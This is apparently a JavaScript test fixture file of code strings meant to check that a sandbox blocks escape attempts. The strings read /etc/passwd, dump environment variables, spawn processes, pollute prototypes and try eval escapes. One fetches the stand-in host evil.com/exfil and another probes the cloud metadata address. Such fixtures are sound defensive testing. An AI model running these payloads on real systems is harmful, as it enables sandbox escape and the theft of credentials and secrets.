/**
 * Malicious code fixtures for sandbox security testing.
 *
 * These are code strings that attempt to escape sandbox isolation.
 * NONE of these should succeed — they should all fail gracefully.
 */

/** Attempt to read host filesystem. */
export const READ_PASSWD = `
  const fs = require("fs");
  return fs.readFileSync("/etc/passwd", "utf8");
`;

/** Attempt to access host environment. */
export const READ_ENV = `
  return JSON.stringify(process.env);
`;

/** Attempt to spawn a child process. */
export const SPAWN_PROCESS = `
  const { execSync } = require("child_process");
  return execSync("whoami").toString();
`;

/** Attempt prototype pollution. */
export const PROTOTYPE_POLLUTION = `
  ({}).__proto__.polluted = true;
  return ({}).polluted;
`;

/** Attempt to use eval for escape. */
export const EVAL_ESCAPE = `
  return eval("process.mainModule.require('fs')");
`;

/** Attempt to use Function constructor. */
export const FUNCTION_CONSTRUCTOR = `
  const fn = new Function("return process.env");
  return fn();
`;

/** Attempt to import host module. */
export const DYNAMIC_IMPORT = `
  const fs = await import("fs");
  return fs.readFileSync("/etc/passwd", "utf8");
`;

/** Path traversal attempt via file access. */
export const PATH_TRAVERSAL = `
  return await sandbox.fs.read("../../etc/passwd");
`;

/** Attempt to access network. */
export const NETWORK_ACCESS = `
  const res = await fetch("http://evil.com/exfil");
  return res.text();
`;

/** Attempt SSRF to cloud metadata. */
export const SSRF_METADATA = `
  const res = await fetch("http://169.254.169.254/latest/meta-data/");
  return res.text();
`;
